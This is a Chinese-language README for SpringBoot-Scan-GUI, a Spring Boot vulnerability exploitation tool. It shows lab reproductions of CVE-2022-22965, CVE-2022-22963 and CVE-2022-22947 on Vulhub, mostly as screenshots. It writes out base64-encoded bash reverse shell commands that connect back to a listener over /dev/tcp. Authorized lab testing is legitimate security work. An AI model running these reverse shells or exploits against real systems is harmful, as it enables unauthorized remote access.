![SpringBoot-Scan-GUI](https://socialify.git.ci/13exp/SpringBoot-Scan-GUI/image?font=Bitter&forks=1&issues=1&language=1&name=1&owner=1&pattern=Diagonal%20Stripes&stargazers=1&theme=Dark)

## 免责声明
本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。
在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。
如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

## 📝 简介
**SpringBoot Scan GUI | Spring Boot漏洞利用工具说明 - 🔰雨苁ℒ🔰 https://www.ddosi.org/springboot-scan-gui/

**开源工具 [SpringBoot-Scan]  https://github.com/AabyssZG/SpringBoot-Scan 的GUI图形化版本，对你有用的话麻烦点个Star哈哈~

**[SpringBoot-Scan] https://github.com/mwb0350/SpringBoot-Scan

**注意：本工具内置相关漏洞的Exp，杀软报毒属于正常现象！**

## Windows使用

```
python3 SpringBoot-Scan-GUI.py
```

也可以直接下载执行release打包好的exe程序

## Linux使用

```
python3 SpringBoot-Scan-GUI-Linux.py
```

或者使用 `wine` 来执行：

```
sudo wine SpringBoot-Scan-GUI.exe
```

## VulHub 漏洞测试环境搭建

```
git clone https://github.com/vulhub/vulhub.git
```

### 安装Docker环境

```
sudo apt-get install docker.io
sudo apt install docker-compose
```

### 搭建CVE-2022-22965

```
cd /vulhub/CVE-2022-22965
sudo docker-compose up -d
```

### 搭建CVE-2022-22963

```
cd /vulhub/CVE-2022-22963
sudo docker-compose up -d
```

### 搭建CVE-2022-22947

```
cd /vulhub/CVE-2022-22947
sudo docker-compose up -d
```

如果报错，自行修改 `.yml` 文件中映射的端口号

## 漏洞复现演示

### 一、CVE-2022-22965

#### VulHub 环境复现

![image](https://user-images.githubusercontent.com/73600604/218236128-21bf37e5-e8c2-45de-9f9e-50fbe8ad1574.png)
![image](https://user-images.githubusercontent.com/73600604/218236233-68986684-4698-46d0-a36e-d95d37a2620b.png)
![image](https://user-images.githubusercontent.com/73600604/218236243-0d6b2eb4-6b2d-4c88-91ea-be4a5760675d.png)

**内置shell**
![image](https://user-images.githubusercontent.com/73600604/218236608-102b9342-1f92-4268-88de-9f35c5de22ce.png)

**aabysszg-shell**
![image](https://user-images.githubusercontent.com/73600604/218236258-348c30f4-7a5e-43e9-8f12-0f4eb1f27e99.png)

**13exp-shell**

![image](https://user-images.githubusercontent.com/73600604/218236580-097727c0-cd79-47bc-af8a-3b509324ec3e.png)

#### 春秋云境 环境复现

![image](https://user-images.githubusercontent.com/73600604/218236469-833740d2-b754-46d8-848d-89236f5ec72b.png)

**内置shell**
![image](https://user-images.githubusercontent.com/73600604/218236715-9815addd-2502-4e6c-a11c-5ccd054a57ac.png)

**13exp-shell**
![image](https://user-images.githubusercontent.com/73600604/218236734-655bcfe4-0eac-433d-aa66-07ad51af9fbb.png)

**aabysszg-shell**
![image](https://user-images.githubusercontent.com/73600604/218236497-11401635-b171-4536-9faa-f431324612a9.png)
![image](https://user-images.githubusercontent.com/73600604/218236516-71dae6a1-3f59-459c-82c8-b49c3d191f6c.png)

### 二、CVE-2022-22963

#### VulHub 环境复现

准备反弹shell：

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA1Lzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i} || (Base64)
```

编码内容→ `bash -i >& /dev/tcp/192.168.0.105/8888 0>&1`

Kali监听对应端口：
![image](https://user-images.githubusercontent.com/73600604/218240588-a377065e-c4fc-403c-950d-0e688b7e446c.png)

**漏洞利用**
![image](https://user-images.githubusercontent.com/73600604/218240553-009588c6-be8f-4bbd-9fe8-d3e8cc001795.png)
![image](https://user-images.githubusercontent.com/73600604/218240609-246afc87-e671-4565-bf68-f3dda7360961.png)

#### 春秋云境 环境复现

注:云境反弹shell需使用公网服务器

服务器监听
![image](https://user-images.githubusercontent.com/73600604/218291287-9b248ffa-f4fe-4195-b665-ba333aa5721c.png)

![image](https://user-images.githubusercontent.com/73600604/218291509-dca8ef79-3453-4add-bba1-cfd513a4fbc3.png)
![image](https://user-images.githubusercontent.com/73600604/218291366-7eb7e58b-54ca-4d72-bd0e-f6bc6fa4367f.png)


### 三、CVE-2022-22947

#### VulHub 环境复现

同样准备反弹shell

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA1Lzg4ODkgMD4mMQ==}|{base64,-d}|{bash,-i} || (Base64)
```

编码内容→ `bash -i >& /dev/tcp/192.168.0.105/8889 0>&1`

kali监听对应端口：
![image](https://user-images.githubusercontent.com/73600604/218240722-f36a7ac5-b2c3-4043-9b9e-54be43052799.png)

**漏洞利用**
![image](https://user-images.githubusercontent.com/73600604/218240756-52bb0691-bcbe-4057-b502-716d86aa2a1d.png)
![image](https://user-images.githubusercontent.com/73600604/218241387-1c6b9198-3e76-434b-8a8d-96533613cd26.png)

#### 春秋云境 环境复现

![image](https://user-images.githubusercontent.com/73600604/218237116-b3897e7c-2c88-45c6-97ad-276c3e7be052.png)
![image](https://user-images.githubusercontent.com/73600604/218257247-eb1ec709-dcaa-4855-8890-c263c15bc890.png)

## 项目Star统计

![star](https://starchart.cc/13exp/SpringBoot-Scan-GUI.svg)

## 免责声明
本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。
在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。
如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。
